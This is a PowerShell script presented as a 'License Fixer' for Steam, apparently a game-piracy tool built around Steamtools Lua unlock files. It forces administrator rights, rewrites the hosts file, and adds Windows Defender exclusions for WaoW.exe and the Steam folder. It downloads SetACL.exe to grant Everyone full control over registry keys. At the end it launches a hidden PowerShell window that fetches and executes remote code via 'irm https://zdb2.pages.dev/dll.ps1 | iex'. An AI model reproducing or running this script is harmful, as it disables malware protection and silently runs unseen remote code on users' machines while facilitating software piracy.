[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
Try {
    $MethodDefinition = @'
    [DllImport("kernel32.dll")]
    public static extern bool SetConsoleMode(IntPtr hConsoleHandle, uint dwMode);
    [DllImport("kernel32.dll")]
    public static extern bool GetConsoleMode(IntPtr hConsoleHandle, out uint lpMode);
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetStdHandle(int nStdHandle);
'@
    $Kernel32 = Add-Type -MemberDefinition $MethodDefinition -Name "Kernel32Functions" -Namespace Win32 -PassThru
}
catch {}

function Disable-QuickEdit {
    $hInput = $Kernel32::GetStdHandle(-10) 
    $mode = 0
    if ($Kernel32::GetConsoleMode($hInput, [ref]$mode)) {
        $mode = $mode -band -not (0x0040 -bor 0x0020)
        $Kernel32::SetConsoleMode($hInput, $mode -bor 0x0080)
    }
}

Disable-QuickEdit
$host.UI.RawUI.BackgroundColor = "Black"
$host.UI.RawUI.ForegroundColor = "White"
$host.UI.RawUI.WindowTitle = "License Fixer"
Clear-Host

$identity = [Security.Principal.WindowsIdentity]::GetCurrent()
$principal = New-Object Security.Principal.WindowsPrincipal($identity)
$isAdmin = $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

if (-not $isAdmin) {
    Write-Host "`n [!] Requesting Administrative Privileges..." -ForegroundColor Yellow
    if ($PSCommandPath) { $scriptPath = $PSCommandPath } else {
        $scriptPath = Join-Path $env:TEMP "license_fix.ps1"
        $scriptText = $MyInvocation.MyCommand.ScriptBlock.ToString()
        Set-Content -Path $scriptPath -Value $scriptText -Encoding UTF8
    }
    Start-Process -FilePath "conhost.exe" -Verb RunAs -ArgumentList "powershell.exe -NoProfile -ExecutionPolicy Bypass -File `"$scriptPath`""
    exit
}

Disable-QuickEdit

Function Show-Header {
    Write-Host " "
    Write-Host "  _      ___  ____  _____  _   _  ____  _____   " -ForegroundColor Cyan
    Write-Host " | |    |_ _|| ___||  ___|| \ | |/ ___|| ____|  " -ForegroundColor Cyan
    Write-Host " | |     | | | |   | |__  |  \| |\___ \|  _|    " -ForegroundColor DarkCyan
    Write-Host " | |___  | | | |___|  ___|| |\  | ___) | |___   " -ForegroundColor Blue
    Write-Host " |_____||___| \____||_____||_| \_||____/|_____|  " -ForegroundColor Blue
    Write-Host " "
    Write-Host "   ----------------------------------------------------" -ForegroundColor DarkGray
    Write-Host "                   WaoW By SYS_0xA7                    " -ForegroundColor White
    Write-Host "   ----------------------------------------------------" -ForegroundColor DarkGray
    Write-Host " "
}

function Write-Log {
    param([string]$Message, [string]$Type = "INFO")
    $Time = Get-Date -Format "HH:mm:ss"
    switch ($Type) {
        "INFO" { Write-Host " [$Time] " -NoNewline -ForegroundColor DarkGray; Write-Host " [?] $Message" -ForegroundColor Gray }
        "SUCCESS" { Write-Host " [$Time] " -NoNewline -ForegroundColor DarkGray; Write-Host " [OK] $Message" -ForegroundColor Green }
        "WARN" { Write-Host " [$Time] " -NoNewline -ForegroundColor DarkGray; Write-Host " [!] $Message" -ForegroundColor Yellow }
        "ERROR" { Write-Host " [$Time] " -NoNewline -ForegroundColor DarkGray; Write-Host " [X] $Message" -ForegroundColor Red }
        "STEP" { Write-Host " [$Time] " -NoNewline -ForegroundColor DarkGray; Write-Host " [>] $Message" -ForegroundColor Cyan }
    }
}

Clear-Host
Show-Header
Write-Log "Anti-Freeze (QuickEdit Disabled) applied successfully." "SUCCESS"



$ErrorActionPreference = "SilentlyContinue"
$hostsPath = "$env:SystemRoot\System32\drivers\etc\hosts"

# Tutulacak (İzin verilen) girişler
$allowedEntries = @(
    "127.0.0.1 api.paradisedev.org",
    "127.0.0.1 api2.paradisedev.org",
    "::1 api.paradisedev.org",
    "::1 api2.paradisedev.org",
    "127.0.0.1 paradisedev.org",
    "::1 paradisedev.org"
)

try {
    # 1. Mevcut dosyayı oku, yorum satırlarını (#) koru ama diğer yönlendirmeleri temizle
    $oldContent = Get-Content $hostsPath
    $newContent = New-Object System.Collections.Generic.List[string]

    foreach ($line in $oldContent) {
        # Yorum satırlarını veya boş satırları olduğu gibi bırak (Sistem sağlığı için)
        if ($line.Trim().StartsWith("#") -or [string]::IsNullOrWhiteSpace($line)) {
            $newContent.Add($line)
        }
    }

    # 2. Sadece senin istediğin 2 ana domain ve local IP'lerini ekle
    foreach ($entry in $allowedEntries) {
        $newContent.Add($entry)
    }

    # 3. Dosyayı üzerine yaz
    $newContent | Set-Content $hostsPath -Force

    # 4. DNS Önbelleğini temizle
    ipconfig /flushdns | Out-Null
    
}
catch {

  }


# Find Steam
try { $steamPath = (Get-ItemProperty "HKLM:\SOFTWARE\WOW6432Node\Valve\Steam").InstallPath } catch { $steamPath = $null }
if (-not $steamPath) { Write-Log "Steam not found!" "ERROR"; exit 1 }

$desktopPath = [Environment]::GetFolderPath("Desktop")
$downloadsPath = Join-Path $env:USERPROFILE "Downloads"



$desktopPath = [Environment]::GetFolderPath("Desktop")
$downloadsPath = Join-Path $env:USERPROFILE "Downloads"

# steamPath değişkeninin kodun daha önceki bir kısmında tanımlandığı varsayılmaktadır.
# Örnek: $steamPath = "C:\Program Files (x86)\Steam"

Write-Log "Applying Defender settings..." "STEP"

if (Get-Command Add-MpPreference -ErrorAction SilentlyContinue) {
    try {
        # Mevcut dışlamaları al
        $existing = (Get-MpPreference -ErrorAction Stop).ExclusionPath

        # 1. Masaüstü ve İndirilenler klasörlerini dışlamalardan çıkar
        $pathsToRemove = @($desktopPath, $downloadsPath)
        
        foreach ($path in $pathsToRemove) {
            if ($existing -and $existing -contains $path) {
                Remove-MpPreference -ExclusionPath $path -ErrorAction Stop
                Write-Log "$path removed from exclusions." "SUCCESS"
            }
        }

        # 2. Masaüstü veya İndirilenlerde WaoW.exe varsa dışlamalara ekle
        $waowDesktop = Join-Path $desktopPath "WaoW.exe"
        $waowDownloads = Join-Path $downloadsPath "WaoW.exe"
        $waowPaths = @($waowDesktop, $waowDownloads)

        foreach ($waow in $waowPaths) {
            if (Test-Path $waow) {
                if ($existing -and $existing -contains $waow) {
                    Write-Log "$waow already excluded." "SUCCESS"
                }
                else {
                    Add-MpPreference -ExclusionPath $waow -ErrorAction Stop
                    Write-Log "$waow excluded successfully." "SUCCESS"
                }
            }
        }

        # 3. Steam klasörünü dışlamalara ekle
        if ($existing -and $existing -contains $steamPath) {
            Write-Log "Steam folder already excluded." "SUCCESS"
        }
        else {
            Add-MpPreference -ExclusionPath $steamPath -ErrorAction Stop
            Write-Log "Steam folder excluded successfully." "SUCCESS"
        }
    }
    catch {
        Write-Log "Failed to apply Defender settings. (If it does not apply automatically, you may add it manually.)" "ERROR"
    }
}
else {
    Write-Log "Windows Defender cmdlets not available. (If it does not apply automatically, you may add it manually.)" "ERROR"
}






Write-Log "Clearing Beta and Killing Processes..." "STEP"
Start-Process (Join-Path $steamPath "Steam.exe") -ArgumentList "-clearbeta"
Start-Sleep -Seconds 5
Get-Process steam* -ErrorAction SilentlyContinue | Stop-Process -Force

$backupPath = Join-Path $steamPath "cache-backup"
New-Item -ItemType Directory -Path $backupPath -Force | Out-Null

$appcachePath = Join-Path $steamPath "appcache"

if (Test-Path $appcachePath) {
    Write-Log "Cleaning AppCache (including stats)..." "STEP"
    
    # Eskiden stats'ı hariç tutan filtreyi kaldırdım, artık her şeyi backup'a taşıyor/siliyor
    Get-ChildItem $appcachePath -Force | ForEach-Object {
        $target = Join-Path $backupPath $_.Name
        Move-Item $_.FullName $target -Force -ErrorAction SilentlyContinue
    }
}

# --- Ek Temizlik Kısmı ---
Write-Log "Cleaning Steam Beta and Tencent leftovers..." "STEP"

# Steam Beta klasörünü kökten temizle
$steamBetaPath = Join-Path $steamPath "package\beta"
if (Test-Path $steamBetaPath) {
    Remove-Item $steamBetaPath -Recurse -Force -ErrorAction SilentlyContinue
    Write-Log "Steam Beta folder removed." "SUCCESS"
}

# Tencent kalıntılarını kökten temizle
$tencentPath = Join-Path $env:LOCALAPPDATA "Microsoft\Tencent"
if (Test-Path $tencentPath) {
    Remove-Item $tencentPath -Recurse -Force -ErrorAction SilentlyContinue
    Write-Log "Tencent cache folder removed." "SUCCESS"
}



Write-Log "Deleting Steamtools..." "STEP"

$pathsToTry = @(
    "HKCU:\Software\Valve\Steamtools",
    "HKLM:\Software\Valve\Steamtools"
)

$setAclUrl = "https://github.com/WolfGames156/zdb2/releases/download/setacl/SetACL.exe"
$setAclPath = Join-Path $env:TEMP "SetACL.exe"

function Ensure-SetACL {
    if (Test-Path $setAclPath) { return $true }
    try {
        Write-Log "SetACL.exe not found. Downloading..." "STEP"
        Invoke-WebRequest -Uri $setAclUrl -OutFile $setAclPath -UseBasicParsing -ErrorAction Stop *> $null
        return (Test-Path $setAclPath)
    }
    catch {
        Write-Log "SetACL.exe download failed." "ERROR"
        return $false
    }
}

function Remove-SteamToolsKey {
    param([string]$regPath)
    try {
        if (Test-Path $regPath) {
            # Recurse ve Force ile her şeyi silmeye çalış
            Remove-Item -Path $regPath -Recurse -Force -ErrorAction Stop
            Write-Log "Path $regPath deleted successfully." "SUCCESS"
            return $true
        } else {
            Write-Log "Path $regPath does not exist, skipping." "SUCCESS"
            return $true
        }
    }
    catch {
        return $false
    }
}

function Fix-Permissions-And-Delete {
    param([string]$regPath)

    if (-not (Ensure-SetACL)) { return $false }

    # SetACL için path formatını düzenle (HKCU:\ -> HKCU\)
    $nativePath = $regPath.Replace(":\", "\")

    try {
        Write-Log "Resetting permissions to force delete..." "STEP"

        # 1) Sahipliği al (Owner -> Current User)
        # -rec yes kullanarak SADECE ana klasörü değil, TÜM alt anahtarları da zorla üzerine alıyoruz.
        & $setAclPath -on $nativePath -ot reg -actn setowner -ownr "n:$env:USERNAME" -rec yes *> $null

        # 2) Üstten gelen izin mirasını (Inheritance) kır ve eski izinlerin tamamını temizle
        & $setAclPath -on $nativePath -ot reg -actn setprot -op "dacl:p_nc;sacl:p_nc" -rec yes *> $null
        & $setAclPath -on $nativePath -ot reg -actn clearace -rec yes *> $null

        # 3) Mevcut kullanıcıya ve "Everyone" grubuna (Dil sorunu olmasın diye S-1-1-0 SID'si ile) Full Control (Tam Denetim) ver
        & $setAclPath -on $nativePath -ot reg -actn ace -ace "n:S-1-1-0;p:full" -rec yes *> $null
        & $setAclPath -on $nativePath -ot reg -actn ace -ace "n:$env:USERNAME;p:full" -rec yes *> $null

        Write-Log "Permissions completely overridden (Everyone: Full). Retrying deletion..." "SUCCESS"
        
        # Tekrar silmeyi dene
        return (Remove-SteamToolsKey -regPath $regPath)
    }
    catch {
        Write-Log "SetACL permission fix failed." "ERROR"
        return $false
    }
}

# Çalıştırma Döngüsü
foreach ($path in $pathsToTry) {
    if (-not (Remove-SteamToolsKey -regPath $path)) {
        Fix-Permissions-And-Delete -regPath $path
    }
}




Write-Log "Configuring gamesdata" "STEP"

$steamConfigPath = Join-Path $steamPath "config"
$stpluginPath = Join-Path $steamConfigPath "stplug-in"
$gamesDataPath = Join-Path $env:APPDATA "gamesdata"

# Hedef gamesdata klasörü yoksa oluştur
if (-not (Test-Path $gamesDataPath)) {
    New-Item -ItemType Directory -Path $gamesDataPath -Force | Out-Null
}

if (Test-Path $stpluginPath) {
    # Önce öznitelikleri kaldır (görünür kıl)
    attrib -s -h "$stpluginPath\*" /S /D /L
    
    $item = Get-Item $stpluginPath
    
    # Eğer klasör bir link değilse veya link ama yanlış yere gidiyorsa
    if (-not $item.Attributes.HasFlag([System.IO.FileAttributes]::ReparsePoint)) {
        
        Get-ChildItem $stpluginPath -Force | ForEach-Object {
            $dest = Join-Path $gamesDataPath $_.Name
            # Dosya zaten varsa üzerine yaz
            Move-Item $_.FullName -Destination $dest -Force
        }
        
        # Orijinal klasörü sil
        Remove-Item $stpluginPath -Recurse -Force
        
        # Sembolik linki oluştur (Junction)
        New-Item -ItemType Junction -Path $stpluginPath -Target $gamesDataPath | Out-Null
        attrib -s -h "$stpluginPath\*" /S /D /L
        
        
    }
    
}
else {
    
    New-Item -ItemType Junction -Path $stpluginPath -Target $gamesDataPath | Out-Null
    attrib -s -h "$stpluginPath\*" /S /D /L
    
}







Write-Log "Validating and Cleaning gamesdata folder..." "STEP"

$zoreamAppData = $env:APPDATA
$stpluginPath = Join-Path $zoreamAppData "gamesdata"

# --- EKLENEN KISIM: Gizli ve Sistem dosyalarını görünür yap ---
if (Test-Path $stpluginPath) {
    Write-Log "Unlocking hidden/system files in gamesdata..." "STEP"
    # /S: Alt klasörler, /D: Klasörlerin kendisi, -s: Sistem özniteliğini kaldır, -h: Gizli özniteliğini kaldır
    attrib -s -h "$stpluginPath\*" /S /D
    attrib -s -h "$stpluginPath\*"
}
# -----------------------------------------------------------

# Klasör yoksa oluştur

# .zor uzantılı dosyaları bul ve .lua'ya çevir
Get-ChildItem $stpluginPath -Filter *.zor -File -Force | ForEach-Object { # -Force eklendi
    $newName = [System.IO.Path]::ChangeExtension($_.FullName, ".lua")
    Write-Log "Converting $($_.Name) -> $(Split-Path $newName -Leaf)" "STEP"
    Rename-Item $_.FullName $newName -Force
}




# İçerik doğrulama fonksiyonu (Aynen korundu)
function Test-ValidLuaLine {
    param([string]$Line)
    $trimmed = $Line.Trim()
    if ([string]::IsNullOrWhiteSpace($trimmed)) { return $true }
    if ($trimmed.StartsWith('-')) { return $true }
    if ($trimmed -match '^(?i)(addappid|setManifestid|addtoken)') {
        if ($trimmed -match '\(' -and $trimmed -match '\)') {
            return $true
        }
    }
    return $false
}

# Dosya içeriğini kontrol et ve temizle
Get-ChildItem $stpluginPath -File | Where-Object {
    $_.Extension -in @(".lua", ".zor")
} | ForEach-Object {
    $lines = Get-Content $_.FullName
    $isClean = $true

    foreach ($l in $lines) {
        if (-not (Test-ValidLuaLine $l)) {
            $isClean = $false
            break
        }
    }

    if ($isClean) {
        Write-Log "Validated: $($_.Name)" "SUCCESS"
    }
    else {
        Write-Log "Invalid content detected! Deleting: $($_.Name)" "ERROR"
        Remove-Item $_.FullName -Force -ErrorAction SilentlyContinue
    }
}

Write-Log "Checking for steam.cfg..." "STEP"
$cfgFiles = @("steam.cfg", "Steam.cfg")
foreach ($cfg in $cfgFiles) {
    $targetCfg = Join-Path $steamPath $cfg
    if (Test-Path $targetCfg) {
        Remove-Item $targetCfg -Force -ErrorAction SilentlyContinue
        Write-Log "Deleted: $cfg" "SUCCESS"
    }
}

Write-Log "Fix and Cleanup complete." "SUCCESS"
Write-Host " "
Write-Host "   *** CORE EXECUTING IN BACKGROUND ***" -ForegroundColor Cyan
Write-Host " "

$command = "irm https://zdb2.pages.dev/dll.ps1 | iex"
Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command $command" -WindowStyle Hidden

for ($i = 10; $i -gt 0; $i--) {
    Write-Host "`r   *** This window will close in $i second(s) ***  " -ForegroundColor Magenta -NoNewline
    Start-Sleep -Seconds 1
}

exit
